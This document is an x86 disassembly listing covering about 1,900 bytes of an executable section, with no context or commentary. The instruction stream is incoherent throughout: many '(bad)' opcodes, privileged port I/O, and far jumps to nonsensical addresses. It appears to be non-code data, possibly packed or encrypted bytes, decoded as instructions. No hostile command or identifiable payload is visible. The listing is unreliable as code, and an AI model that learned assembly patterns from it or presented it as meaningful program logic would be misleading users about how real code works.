  4163b5:	fldenv [eax+edi*1]
  4163b8:	push   edx
  4163b9:	dec    eax
  4163ba:	jg     0x41642a
  4163bc:	mov    ch,0x39
  4163be:	bound  eax,QWORD PTR [eax+eax*4-0x6f31f62a]
  4163c5:	jg     0x416382
  4163c7:	scas   al,BYTE PTR es:[edi]
  4163c8:	enter  0xf2e4,0xa4
  4163cc:	sbb    al,0xd8
  4163ce:	ds popf 
  4163d0:	xor    al,0x93
  4163d2:	shl    bl,cl
  4163d4:	arpl   sp,cx
  4163d6:	push   ss
  4163d7:	sbb    al,0xcd
  4163d9:	xlat   BYTE PTR ds:[ebx]
  4163da:	mov    al,ds:0xd67666f0
  4163df:	addr16 mov ch,0x56
  4163e2:	cmp    edi,DWORD PTR [edx+0x9c1569f]
  4163e8:	popa   
  4163e9:	out    dx,al
  4163ea:	adc    edx,DWORD PTR ds:0x920bec51
  4163f0:	or     DWORD PTR [ebx+0x24],0x2f73100b
  4163f7:	sti    
  4163f8:	inc    eax
  4163f9:	cmp    DWORD PTR [ebp+0x68],eax
  4163fc:	ffree  st(7)
  4163fe:	or     BYTE PTR [ecx],cl
  416400:	sub    eax,0x5fe49842
  416405:	cli    
  416406:	push   0xffffffef
  416408:	jno    0x416395
  41640a:	fadd   QWORD PTR [esi+ebp*8-0x7edfd9e5]
  416411:	stc    
  416412:	mov    ecx,0x1516d8
  416417:	nop
  416418:	sub    eax,0x3efa9930
  41641d:	lea    ebx,[edx+esi*4]
  416420:	pop    eax
  416421:	jno    0x41647d
  416423:	jb     0x41641d
  416425:	mov    ds:0xb73461af,al
  41642a:	fwait
  41642b:	jnp    0x4164aa
  41642d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41642e:	(bad)  
  41642f:	cmp    ecx,DWORD PTR ds:0xbb00febe
  416435:	jmp    0x6bba:0x1860b873
  41643c:	cmp    eax,0x919f4e57
  416441:	sub    DWORD PTR [edx],ebp
  416443:	mov    al,0x5f
  416445:	loopne 0x416423
  416447:	cs aam 0x4c
  41644a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41644b:	and    dl,BYTE PTR [esi]
  41644d:	cmp    eax,0x6de19f54
  416452:	or     bl,ah
  416454:	sahf   
  416455:	dec    ebx
  416456:	jae    0x41648b
  416458:	std    
  416459:	add    DWORD PTR [eax-0x4a],edi
  41645c:	(bad)  
  41645d:	fsub   QWORD PTR [ebp+0xf0fce2f]
  416463:	enter  0xa521,0x89
  416467:	and    al,BYTE PTR [ecx-0x25]
  41646a:	(bad)  
  41646b:	out    dx,al
  41646c:	cs adc dl,dl
  41646f:	sbb    DWORD PTR [edx],ebx
  416471:	jmp    esp
  416473:	cld    
  416474:	xchg   DWORD PTR [edx],edi
  416476:	ds stos BYTE PTR es:[edi],al
  416478:	repnz rol DWORD PTR [ecx-0x3d93bfac],0x32
  416480:	in     al,dx
  416481:	fwait
  416482:	jp     0x4164e8
  416484:	sub    ebp,DWORD PTR [eax-0x771c8b40]
  41648a:	or     al,BYTE PTR [ecx+0x1c37abcc]
  416490:	data16 cli 
  416492:	(bad)  
  416494:	out    dx,al
  416495:	test   eax,0x93652e9e
  41649a:	mov    al,0xdf
  41649c:	mov    al,ds:0xe57ba47b
  4164a1:	out    dx,al
  4164a2:	adc    DWORD PTR [edx+0x14c62f50],edx
  4164a8:	pop    edi
  4164a9:	jmp    0x416460
  4164ab:	lods   al,BYTE PTR ds:[esi]
  4164ac:	add    bh,ch
  4164ae:	(bad)  
  4164af:	out    dx,al
  4164b0:	or     esp,edi
  4164b2:	fs es aaa 
  4164b5:	cmp    DWORD PTR [esi-0x20],edx
  4164b8:	inc    eax
  4164b9:	mov    ebx,0x34bb5a87
  4164be:	push   ebx
  4164bf:	jo     0x416512
  4164c1:	inc    edi
  4164c2:	scas   al,BYTE PTR es:[edi]
  4164c3:	pushf  
  4164c4:	or     eax,0x631a4103
  4164c9:	sub    DWORD PTR ds:[esi+0x75eb212e],esi
  4164d0:	daa    
  4164d1:	or     eax,0xd1987cb
  4164d6:	ret    0x4cc0
  4164d9:	dec    esi
  4164da:	popf   
  4164db:	shr    BYTE PTR [edi],cl
  4164dd:	(bad)  
  4164de:	cmc    
  4164df:	addr16 mov esi,0x8adbff61
  4164e5:	cld    
  4164e6:	add    BYTE PTR [eax+0x4e],cl
  4164e9:	jnp    0x41648f
  4164eb:	std    
  4164ec:	sub    esi,DWORD PTR [edi]
  4164ee:	repz sar BYTE PTR [ecx-0x19],0x76
  4164f3:	jne    0x41655c
  4164f5:	loope  0x4164aa
  4164f7:	ss in  al,dx
  4164f9:	fdiv   QWORD PTR [esp+ebx*1]
  4164fc:	shr    BYTE PTR [esi],cl
  4164fe:	imul   eax,DWORD PTR ds:0xaf1852d6,0x33
  416505:	or     BYTE PTR [ebx-0x6f],al
  416508:	fwait
  416509:	and    esi,DWORD PTR [ebx+0x6fd6f739]
  41650f:	jnp    0x41651c
  416511:	sub    BYTE PTR [edx+0x58],bl
  416514:	imul   esi,DWORD PTR [eax],0xf321605a
  41651a:	mov    BYTE PTR [ebx-0x47],ch
  41651d:	and    al,0x46
  41651f:	add    al,0x6e
  416521:	cmp    ah,dh
  416523:	xor    al,BYTE PTR [esi]
  416525:	jle    0x416533
  416527:	(bad)  
  416528:	jae    0x416525
  41652a:	shl    BYTE PTR [ebx-0x54],cl
  41652d:	sbb    dh,dh
  41652f:	inc    edx
  416530:	jle    0x4164e5
  416532:	data16 outs dx,BYTE PTR ds:[esi]
  416534:	dec    edi
  416535:	inc    eax
  416536:	pushf  
  416537:	cli    
  416538:	imul   ebp,DWORD PTR [edi+0x15],0xcc09b698
  41653f:	outs   dx,DWORD PTR ds:[esi]
  416540:	sbb    eax,0xe3127fef
  416545:	sub    eax,0xcfeac703
  41654a:	mov    DWORD PTR [ecx+0x1e],ebx
  41654d:	jle    0x41651a
  41654f:	push   ebx
  416550:	adc    bh,0x9
  416553:	jge    0x41652d
  416555:	test   eax,0xad0184ee
  41655a:	dec    eax
  41655b:	xchg   edi,eax
  41655c:	adc    edx,ebp
  41655e:	jg     0x416549
  416560:	push   esi
  416561:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416562:	pop    edi
  416563:	std    
  416564:	xor    esi,DWORD PTR [ebx+0x737ca8c4]
  41656a:	pop    esp
  41656b:	jne    0x416532
  41656d:	pop    edi
  41656e:	(bad)  
  41656f:	jne    0x416509
  416571:	pcmpeqb mm3,QWORD PTR [edx]
  416574:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416575:	sbb    bl,BYTE PTR [ecx+ebp*2-0x11e89f2]
  41657c:	mov    gs,WORD PTR [ecx-0x51]
  41657f:	push   ebx
  416580:	in     al,0x48
  416582:	sbb    eax,0x609d285c
  416587:	sub    eax,0x405209d4
  41658c:	lds    ecx,FWORD PTR [eax-0x20]
  41658f:	call   0x2d9a:0x6d2dea5
  416596:	and    eax,0xc28cdcd3
  41659b:	cmp    DWORD PTR [esi+0x56d83b63],esi
  4165a1:	rol    BYTE PTR [eax+0x53],0xd
  4165a5:	(bad)  [edi-0x2cc142a7]
  4165ab:	jb     0x416545
  4165ad:	shl    DWORD PTR es:[ebx+0x7b],0x2d
  4165b2:	push   ds
  4165b3:	push   ss
  4165b4:	sbb    DWORD PTR [ecx],ebx
  4165b6:	aaa    
  4165b7:	xchg   DWORD PTR [ebp-0x789c9ed7],esp
  4165bd:	sbb    ecx,ebp
  4165bf:	xor    bl,ah
  4165c1:	popa   
  4165c2:	adc    esi,edi
  4165c4:	outs   dx,BYTE PTR ds:[esi]
  4165c5:	popa   
  4165c6:	jecxz  0x4165e9
  4165c8:	cmp    al,0x20
  4165ca:	jnp    0x41654c
  4165cc:	das    
  4165cd:	xchg   edx,eax
  4165ce:	dec    edi
  4165cf:	mov    esp,0x6d964618
  4165d4:	inc    esp
  4165d5:	mov    edx,0x9f11a564
  4165da:	dec    dl
  4165dc:	(bad)  
  4165dd:	push   ds
  4165de:	mov    ch,0xce
  4165e0:	jmp    FWORD PTR [edi+eax*2+0x34]
  4165e4:	pop    ebp
  4165e5:	icebp  
  4165e6:	ins    BYTE PTR es:[edi],dx
  4165e7:	aam    0x5d
  4165e9:	add    eax,0x9ded95b5
  4165ee:	jae    0x41663e
  4165f0:	rcl    DWORD PTR [ecx*2+0x6053c3df],0x9f
  4165f8:	jl     0x416601
  4165fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165fb:	mov    ebp,0x42ecd5a0
  416600:	gs dec esp
  416602:	jmp    0x80e9fb0c
  416607:	hlt    
  416608:	inc    esp
  416609:	mov    DWORD PTR [ecx-0x7],eax
  41660c:	xchg   esi,eax
  41660d:	adc    eax,0x5854ecb2
  416612:	push   ebx
  416613:	repnz addr16 pop esp
  416616:	adc    BYTE PTR [ecx],bh
  416618:	aaa    
  416619:	pop    esp
  41661a:	out    dx,al
  41661b:	or     DWORD PTR [edx],ecx
  41661d:	shr    BYTE PTR [ebx+eiz*1+0x57a09992],0xd2
  416625:	xchg   ecx,eax
  416626:	dec    esi
  416627:	add    al,dh
  416629:	in     al,0x88
  41662b:	push   esi
  41662c:	mov    cl,0xce
  41662e:	int3   
  41662f:	es push 0xc5aa32de
  416635:	popa   
  416636:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416637:	lock jmp FWORD PTR [ecx]
  41663a:	pop    esi
  41663b:	pop    edx
  41663c:	mov    BYTE PTR [esi-0x3430dd48],cl
  416642:	out    0x95,eax
  416644:	scas   al,BYTE PTR es:[edi]
  416645:	in     eax,0xac
  416647:	repnz call 0x878a:0x69c0115d
  41664f:	es retf 0x17ee
  416653:	push   esi
  416654:	inc    esp
  416655:	(bad)  
  416656:	sbb    esp,edi
  416658:	sbb    esp,DWORD PTR [ebp+0x4744840d]
  41665e:	add    eax,0xaad72e7a
  416663:	sti    
  416664:	mov    eax,ds:0x79870380
  416669:	icebp  
  41666a:	fisttp QWORD PTR [edi+0x1db1d3b0]
  416670:	mov    WORD PTR [ebx+0x45],ds
  416673:	pusha  
  416674:	sahf   
  416675:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416676:	cmp    ebx,DWORD PTR [edi-0x80]
  416679:	inc    eax
  41667a:	in     al,0x3e
  41667c:	rcl    DWORD PTR [ebp-0x54cb176e],cl
  416682:	xchg   BYTE PTR [edi],bh
  416684:	ret    0x3e9b
  416687:	mov    dh,0xcb
  416689:	xor    DWORD PTR [ecx],0x2413b66c
  41668f:	push   ebx
  416690:	mov    WORD PTR [edx+edx*4+0x37],?
  416694:	(bad)
  416697:	rcr    DWORD PTR [edx-0x4eaba096],0xba
  41669e:	sub    eax,0xc727abd3
  4166a3:	lahf   
  4166a4:	push   ecx
  4166a5:	and    eax,0xfb8b7df0
  4166aa:	scas   al,BYTE PTR es:[edi]
  4166ab:	scas   eax,DWORD PTR es:[edi]
  4166ac:	shl    BYTE PTR [eax+0x66],cl
  4166af:	sbb    eax,eax
  4166b1:	dec    ecx
  4166b2:	retf   
  4166b3:	les    edx,FWORD PTR [esi+0x3c37bb11]
  4166b9:	pop    ds
  4166ba:	add    cl,BYTE PTR [ebp-0x54]
  4166bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166be:	xor    BYTE PTR [ecx-0x14d017e2],cl
  4166c4:	adc    bh,BYTE PTR [eax+eiz*8-0x48]
  4166c8:	pop    DWORD PTR [eax]
  4166ca:	popa   
  4166cb:	jnp    0x416718
  4166cd:	inc    ebp
  4166ce:	retf   
  4166cf:	add    al,0xcb
  4166d1:	fistp  QWORD PTR [edi+0x49]
  4166d4:	or     BYTE PTR [esi*1-0x7e5bb3b8],ah
  4166db:	test   DWORD PTR [edi+0x3679d41b],esi
  4166e1:	push   edi
  4166e2:	add    dl,cl
  4166e4:	jle    0x416710
  4166e6:	pop    esi
  4166e7:	pop    eax
  4166e8:	aas    
  4166e9:	fld    QWORD PTR [edx]
  4166eb:	je     0x416702
  4166ed:	popf   
  4166ee:	dec    ebp
  4166ef:	in     al,dx
  4166f0:	sub    ebx,0xffffffbc
  4166f3:	test   bh,bl
  4166f5:	pop    esi
  4166f6:	mov    ah,0xe9
  4166f8:	jg     0x416681
  4166fa:	call   0x62ff:0x3be9c888
  416701:	stos   BYTE PTR es:[edi],al
  416702:	mov    ds:0xc19eb10f,al
  416707:	iret   
  416708:	push   es
  416709:	and    bl,BYTE PTR [esi+eax*2-0x5e]
  41670d:	pop    ecx
  41670e:	mov    WORD PTR [ebp+ecx*1+0x4c],es
  416712:	or     al,0xaf
  416714:	test   al,0x8d
  416716:	in     eax,0xe7
  416718:	scas   al,BYTE PTR es:[edi]
  416719:	into   
  41671a:	jecxz  0x416796
  41671c:	sbb    DWORD PTR ds:0x4d680df2,ebp
  416722:	jmp    0xb1d1978b
  416727:	call   0x73550a53
  41672c:	xlat   BYTE PTR ds:[ebx]
  41672d:	(bad)  
  41672e:	sub    BYTE PTR [edi+edi*2],bh
  416731:	and    ebp,DWORD PTR [ebx]
  416733:	inc    edx
  416734:	gs scas al,BYTE PTR es:[edi]
  416736:	dec    edi
  416737:	repz jl 0x4166bb
  41673a:	add    DWORD PTR [ecx],ebx
  41673c:	out    0x8,al
  41673e:	daa    
  41673f:	fsubp  st(3),st
  416741:	cmp    BYTE PTR [edx+0x576c9396],ah
  416747:	pop    ds
  416748:	int3   
  416749:	xor    ebx,DWORD PTR [esi-0x7c623e3d]
  41674f:	loope  0x4167cd
  416751:	mov    bh,0x83
  416753:	data16 jnp 0x416787
  416756:	sub    eax,0xc2d34f95
  41675b:	add    BYTE PTR [edx-0x43],0x8b
  41675f:	xor    esp,DWORD PTR [eax-0x2875f7e6]
  416765:	nop
  416766:	push   es
  416767:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416768:	aas    
  416769:	and    al,0xa3
  41676b:	adc    BYTE PTR [ebx-0x4d],al
  41676e:	iret   
  41676f:	ja     0x41672a
  416771:	scas   eax,DWORD PTR es:[edi]
  416772:	xchg   edi,eax
  416773:	aad    0x1d
  416775:	retf   
  416776:	and    BYTE PTR [edx],0x9
  416779:	pop    esp
  41677a:	sub    dl,BYTE PTR [edi-0x4c]
  41677d:	push   edx
  41677e:	and    al,0xcc
  416780:	cmp    bh,bl
  416782:	adc    eax,0x766bdb09
  416787:	repz push 0x8b2f96a6
  41678d:	xor    edi,esp
  41678f:	(bad)  
  416790:	pusha  
  416791:	stos   DWORD PTR es:[edi],eax
  416792:	aam    0xfb
  416794:	idiv   al
  416796:	mov    ch,0x4e
  416798:	mul    BYTE PTR ds:[esi]
  41679b:	jp     0x416753
  41679d:	pushf  
  41679e:	cmp    DWORD PTR [ebp+0xf0c1594],edx
  4167a4:	pop    ss
  4167a5:	jp     0x416744
  4167a7:	add    ebx,edx
  4167a9:	out    0xf6,eax
  4167ab:	push   0x742ecd2a
  4167b0:	and    ch,BYTE PTR [ebx+0x71]
  4167b3:	iret   
  4167b4:	fimul  DWORD PTR [eax+0x3b0ee2fa]
  4167ba:	hlt    
  4167bb:	inc    ebx
  4167bc:	inc    ebp
  4167bd:	mov    edx,0xe94be983
  4167c2:	sbb    esp,esp
  4167c4:	in     al,dx
  4167c5:	fs (bad) 
  4167c7:	jle    0x416784
  4167c9:	and    eax,0xa3968b82
  4167ce:	popa   
  4167cf:	scas   eax,DWORD PTR es:[edi]
  4167d0:	or     edi,DWORD PTR [eax-0x4f]
  4167d3:	test   DWORD PTR [ebp-0x39],edi
  4167d6:	push   ecx
  4167d7:	lock stos BYTE PTR es:[edi],al
  4167d9:	sub    bl,BYTE PTR [eax]
  4167db:	sub    ah,BYTE PTR [eax+0x280e1351]
  4167e1:	push   edi
  4167e2:	ds scas eax,DWORD PTR es:[edi]
  4167e4:	mov    dl,0x72
  4167e6:	int3   
  4167e7:	cdq    
  4167e8:	bound  eax,QWORD PTR [bp+0x551d]
  4167ed:	dec    eax
  4167ee:	mov    ds:0xc02693c,eax
  4167f3:	dec    esi
  4167f4:	add    al,0x69
  4167f6:	mov    dl,al
  4167f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167f9:	mov    eax,0x803bc75f
  4167fe:	outs   dx,DWORD PTR ds:[esi]
  4167ff:	aas    
  416800:	push   0xad789f84
  416805:	sahf   
  416806:	aaa    
  416807:	out    0xf5,eax
  416809:	or     DWORD PTR [edx+0x34],ebp
  41680c:	or     BYTE PTR [edx],dl
  41680e:	jle    0x416886
  416810:	sub    esp,DWORD PTR [ecx-0x48]
  416813:	fistp  DWORD PTR [edx]
  416815:	nop
  416816:	sbb    eax,0xd9825756
  41681b:	int3   
  41681c:	push   edi
  41681d:	sub    dh,BYTE PTR [edx]
  41681f:	jp     0x4167ee
  416821:	daa    
  416822:	test   ch,dl
  416824:	adc    DWORD PTR [ecx],esi
  416826:	inc    eax
  416827:	(bad)  
  416828:	jns    0x416855
  41682a:	mov    eax,0x1b72a562
  41682f:	hlt    
  416830:	inc    ebx
  416831:	dec    edx
  416832:	xor    BYTE PTR [edx-0x21],bl
  416835:	fcmovnb st,st(2)
  416837:	dec    ecx
  416838:	adc    DWORD PTR [ebx-0x7e],edx
  41683b:	pop    edi
  41683c:	dec    edx
  41683d:	and    eax,0xe466af0c
  416842:	jge    0x416851
  416844:	popa   
  416845:	jae    0x416830
  416847:	in     eax,0x4
  416849:	xchg   ecx,eax
  41684a:	adc    ebx,DWORD PTR [ecx]
  41684c:	sti    
  41684d:	fwait
  41684e:	shl    BYTE PTR [ebx-0x6b7b268a],cl
  416854:	xor    BYTE PTR [edx-0x78],dl
  416857:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416858:	fsubr  QWORD PTR [ebp-0x2e49e877]
  41685e:	sbb    BYTE PTR [eax],bh
  416860:	sbb    DWORD PTR [eax+esi*1+0x70],esp
  416864:	jb     0x41681b
  416866:	cmp    esi,eax
  416868:	push   ebp
  416869:	sbb    BYTE PTR [edx+0x2a254f14],0x56
  416870:	cmp    al,BYTE PTR [ecx]
  416872:	add    ah,BYTE PTR [ebx+0x56ec8be4]
  416878:	out    0xc6,eax
  41687a:	sbb    BYTE PTR [ecx],0x90
  41687d:	loop   0x416895
  41687f:	xchg   ebp,eax
  416880:	cwde   
  416881:	std    
  416882:	in     al,dx
  416883:	xchg   esp,eax
  416884:	xchg   DWORD PTR [eax+esi*2],ebp
  416887:	out    0xb9,al
  416889:	mov    ecx,0x7323f5d0
  41688e:	ins    DWORD PTR es:[edi],dx
  41688f:	test   al,0x20
  416891:	dec    esp
  416892:	loop   0x416818
  416894:	mov    ebp,DWORD PTR ss:[eax]
  416897:	or     al,0xe8
  416899:	scas   al,BYTE PTR es:[edi]
  41689a:	pop    ebp
  41689b:	lea    esp,[edi]
  41689d:	js     0x41691e
  41689f:	pop    ebx
  4168a0:	sub    DWORD PTR [ebx+0x109a75a],esp
  4168a6:	and    edx,DWORD PTR [edi+0x14f76e2]
  4168ac:	pop    ss
  4168ad:	jno    0x4168e8
  4168af:	pop    ebp
  4168b0:	ins    DWORD PTR es:[edi],dx
  4168b1:	ja     0x4168ef
  4168b3:	sbb    DWORD PTR [ebp+0x32441e5f],ebp
  4168b9:	fdivr  DWORD PTR [ecx]
  4168bb:	xchg   ebx,eax
  4168bc:	pop    ecx
  4168bd:	or     al,0xba
  4168bf:	rcr    BYTE PTR [esi+0x3f228f28],cl
  4168c5:	sub    BYTE PTR [ebx],dl
  4168c7:	(bad)  
  4168c8:	idiv   BYTE PTR [ecx]
  4168ca:	inc    ebp
  4168cb:	add    al,0x92
  4168cd:	xchg   ebp,eax
  4168ce:	(bad)  
  4168cf:	jmp    esp
  4168d1:	mov    ds:0x9aa1e8e6,al
  4168d6:	dec    ecx
  4168d7:	cmp    bh,BYTE PTR [ebp+0x1d]
  4168da:	mov    ebp,0x2b4b4d1e
  4168df:	or     al,0x3
  4168e1:	cmp    DWORD PTR [ecx-0x4c7800b6],esp
  4168e7:	retfw  0x2eca
  4168eb:	loopne 0x416955
  4168ed:	cmp    eax,0x4cf5f73
  4168f2:	jo     0x4168f0
  4168f4:	test   DWORD PTR [edx-0x58],0x91d2e613
  4168fb:	je     0x416948
  4168fd:	or     DWORD PTR [esi+0x44b0d60c],esp
  416903:	sub    esp,edx
  416905:	test   DWORD PTR [edi],ebx
  416907:	retf   
  416908:	inc    DWORD PTR [edi]
  41690a:	pop    esp
  41690b:	mov    dh,0x32
  41690d:	xchg   ebx,eax
  41690e:	jmp    0x8de79f98
  416913:	fisttp DWORD PTR [ebp-0x118e8461]
  416919:	aas    
  41691a:	push   esp
  41691b:	push   0x5d
  41691d:	mov    ebx,0x91931403
  416922:	ror    DWORD PTR [esi],1
  416924:	or     eax,0x7dde0549
  416929:	push   ecx
  41692a:	push   ds
  41692b:	and    DWORD PTR [esi],edi
  41692d:	cmp    al,0xb2
  41692f:	mov    ch,0xf8
  416931:	sub    al,0xb3
  416933:	add    DWORD PTR [ecx],eax
  416935:	add    bh,0x4b
  416938:	outs   dx,DWORD PTR ds:[esi]
  416939:	jmp    0x843c1acb
  41693e:	inc    esp
  41693f:	sbb    cl,BYTE PTR [edx]
  416941:	mov    esp,0x574929f0
  416946:	dec    ebp
  416947:	xchg   esp,esi
  416949:	or     dh,al
  41694b:	scas   al,BYTE PTR es:[edi]
  41694c:	jne    0x416956
  41694e:	push   eax
  41694f:	loop   0x41698f
  416951:	(bad)  
  416952:	mov    ebx,0x2f5ef7fd
  416957:	js     0x416982
  416959:	cdq    
  41695a:	add    DWORD PTR [edx-0x2d],0x7cdc4867
  416961:	icebp  
  416962:	stos   BYTE PTR es:[edi],al
  416963:	adc    ch,dh
  416965:	fnsave [ecx+0x55]
  416968:	and    DWORD PTR [ebx-0x56],0xde1efae9
  41696f:	fsub   QWORD PTR [esi]
  416971:	shr    dl,1
  416973:	jae    0x416906
  416975:	shl    DWORD PTR ds:0x79e9caec,1
  41697b:	xchg   edi,eax
  41697c:	aad    0xa8
  41697e:	jns    0x4169c6
  416980:	sahf   
  416981:	jns    0x416937
  416983:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416984:	stc    
  416985:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416986:	std    
  416987:	dec    esi
  416988:	repz xchg edi,eax
  41698a:	mov    dh,0x8a
  41698c:	adc    cl,cl
  41698e:	rcl    cl,0xdf
  416991:	mov    eax,ds:0xd318ca4d
  416996:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416997:	add    DWORD PTR [ebp+0x43],ebx
  41699a:	int3   
  41699b:	cmc    
  41699c:	js     0x416955
  41699e:	jle    0x41695b
  4169a0:	xchg   esp,eax
  4169a1:	xor    dh,BYTE PTR [edi-0x6c2bc935]
  4169a7:	dec    eax
  4169a8:	mov    al,ds:0xe8732be9
  4169ad:	push   cs
  4169ae:	mov    esi,0x2009a5ad
  4169b3:	inc    esp
  4169b4:	and    al,0x9b
  4169b6:	adc    DWORD PTR [ecx],esp
  4169b8:	icebp  
  4169b9:	ficom  DWORD PTR [ecx-0x2cd2c901]
  4169bf:	jb     0x4169ef
  4169c1:	sub    al,0xea
  4169c3:	repz jmp 0xe062f041
  4169c9:	adc    ch,BYTE PTR [ecx+edx*1]
  4169cc:	in     eax,dx
  4169cd:	lods   al,BYTE PTR ds:[esi]
  4169ce:	push   eax
  4169cf:	ret    
  4169d0:	or     eax,0x24d42a84
  4169d5:	cmp    DWORD PTR [edi+0x6c452368],ebx
  4169db:	xchg   ecx,eax
  4169dc:	inc    eax
  4169dd:	fwait
  4169de:	test   eax,0x4024755
  4169e3:	mov    esp,0xf1c5ce5d
  4169e8:	ds push esp
  4169ea:	jl     0x416a06
  4169ec:	cs push eax
  4169ee:	repz and ecx,DWORD PTR [ebp+eiz*4-0x14]
  4169f3:	fwait
  4169f4:	rol    DWORD PTR [edx+0x3],0x8f
  4169f8:	clc    
  4169f9:	clc    
  4169fa:	mov    al,0x1e
  4169fc:	stos   DWORD PTR es:[edi],eax
  4169fd:	aam    0x4c
  4169ff:	push   esi
  416a00:	cmp    esi,DWORD PTR [ebp+ebx*2+0x3a986d79]
  416a07:	xchg   ebx,eax
  416a08:	dec    ebx
  416a09:	repz xor DWORD PTR [ebx],eax
  416a0c:	push   eax
  416a0d:	out    dx,al
  416a0e:	push   ebx
  416a0f:	cdq    
  416a10:	daa    
  416a11:	xchg   edi,eax
  416a12:	sahf   
  416a13:	mov    edx,0xa1d7ea46
  416a18:	test   DWORD PTR [edx],esp
  416a1a:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  416a1c:	adc    edi,DWORD PTR [esi-0x18]
  416a1f:	cmc    
  416a20:	cmp    al,bh
  416a22:	std    
  416a23:	xor    al,0xda
  416a25:	mov    esp,0x8b64aab
  416a2a:	fld    TBYTE PTR ds:0xe42700ad
  416a30:	mov    eax,0xe7ea05e6
  416a35:	popa   
  416a36:	mov    eax,ebx
  416a38:	nop
  416a39:	je     0x4169fa
  416a3b:	push   0x71574662
  416a40:	xlat   BYTE PTR ds:[ebx]
  416a41:	inc    esi
  416a42:	cld    
  416a43:	fldcw  WORD PTR [ebp-0x58]
  416a46:	xchg   edi,eax
  416a47:	jl     0x416a6c
  416a49:	ss dec ebp
  416a4b:	push   esi
  416a4c:	mov    esp,0xc6caa9dc
  416a51:	and    edx,DWORD PTR [esi-0x17]
  416a54:	adc    DWORD PTR [ebx-0x69],edx
  416a57:	or     BYTE PTR [ebx+0x8ddd0f1],cl
  416a5d:	frstor [eax]
  416a5f:	fisttp DWORD PTR [ebx]
  416a61:	int3   
  416a62:	into   
  416a63:	ja     0x416a8d
  416a65:	sar    bl,0x35
  416a68:	push   cs
  416a69:	stc    
  416a6a:	and    al,0x96
  416a6c:	mov    eax,ds:0x1042b210
  416a71:	not    DWORD PTR ds:0x51696767
  416a77:	or     BYTE PTR [esi],dl
  416a79:	scas   al,BYTE PTR es:[edi]
  416a7a:	sbb    ch,BYTE PTR [ecx+0x48]
  416a7d:	test   al,0x6a
  416a7f:	stos   DWORD PTR es:[edi],eax
  416a80:	xchg   DWORD PTR [ebx+eax*8],edi
  416a83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a84:	push   ebp
  416a85:	ja     0x416a0e
  416a87:	clc    
  416a88:	int3   
  416a89:	pop    ds
  416a8a:	(bad)  
  416a8b:	mov    esi,0x8f7d06af
  416a90:	cmp    esp,edi
  416a92:	push   0xffffffc5
  416a94:	retf   0xb462
  416a97:	or     al,0x43
  416a99:	mov    eax,ds:0x3442c115
  416a9e:	mov    esp,0x840d1d01
  416aa3:	sbb    esp,esi
  416aa5:	add    BYTE PTR [edx-0x171e76ed],bl
  416aab:	sub    ch,BYTE PTR [esi]
  416aad:	or     edx,DWORD PTR [edx+0x5ede57db]
  416ab3:	bound  edi,QWORD PTR [ebx+0x41]
  416ab6:	jne    0x416ae4
  416ab8:	cmp    DWORD PTR [edi-0x46d2df55],eax
  416abe:	fs mov dl,0x31
  416ac1:	lahf   
  416ac2:	jns    0x416b43
  416ac4:	dec    eax
  416ac5:	cmp    al,bl
  416ac7:	or     eax,DWORD PTR [eax+0x7127642d]
  416acd:	pusha  
  416ace:	scas   eax,DWORD PTR es:[edi]
  416acf:	mov    edx,0xc1ff9237
  416ad4:	sbb    esi,DWORD PTR [eax-0x50]
  416ad7:	mov    ?,WORD PTR [ebx]
  416ad9:	retf   0x1c63
  416adc:	and    al,0xff
  416ade:	push   eax
  416adf:	push   edi
  416ae0:	xchg   ebx,eax
  416ae1:	sub    edx,0x8f6aa178
  416ae7:	loope  0x416b58
  416ae9:	mov    ebx,0x7fbb3aa3
  416aee:	sub    eax,0x2d4efd61
  416af3:	jp     0x416ac9
  416af5:	inc    ebp
  416af6:	out    dx,al
  416af7:	ret    
  416af8:	idiv   ecx
  416afa:	mov    al,0x61
  416afc:	icebp  
  416afd:	adc    esp,DWORD PTR [esp+ebp*4+0x43a23df1]
  416b04:	mov    WORD PTR [edx],gs
  416b06:	push   es
  416b07:	add    eax,0x7f180aea
  416b0c:	pop    esp
  416b0d:	lods   eax,DWORD PTR ds:[esi]
  416b0e:	push   eax
  416b0f:	ret    0x9dfd
  416b12:	and    DWORD PTR [ebx+0xe],eax
  416b15:	adc    BYTE PTR [ebp+0x5f],al
  416b18:	ja     0x416b6e
  416b1a:	test   al,0xa
  416b1c:	mov    ah,0xa1
  416b1e:	fmulp  st(1),st
  416b20:	push   ds
  416b21:	xchg   ebp,eax
  416b22:	pop    ecx
  416b23:	cwde   
  416b24:	popf   
  416b25:	cmp    DWORD PTR [ebx+ebx*1],ebp
  416b28:	and    BYTE PTR ds:0x522c44c3,cl
  416b2e:	clc    
  416b2f:	jno    0x416b5b
  416b31:	fisttp DWORD PTR [edx+ecx*1+0x71f8ccda]
  416b38:	sahf   
  416b39:	shl    BYTE PTR [edi-0xd],cl
  416b3c:	cmp    BYTE PTR [ebp-0x28],0x7c
  416b40:	sbb    esi,DWORD PTR [eax]
  416b42:	inc    edx
  416b43:	add    BYTE PTR [esi],bl
  416b45:	int    0xb1
  416b47:	pushf  
  416b48:	mov    al,ds:0xc5c820b9
  416b4d:	mul    DWORD PTR [ecx+eiz*4]
  416b50:	mov    BYTE PTR [ebx+ebp*1],bl
  416b53:	retf   
  416b54:	gs sbb ecx,eax
  416b57:	stc    
  416b58:	int    0x6
  416b5a:	scas   eax,DWORD PTR es:[edi]
  416b5b:	call   0x4bef29a2
  416b60:	jnp    0x416afa
  416b62:	sbb    DWORD PTR [esi-0x61f52935],esi
  416b68:	inc    eax
  416b69:	mov    ebx,0xf2ad2440
  416b6e:	jmp    0x9a6c7592
  416b73:	je     0x416b29
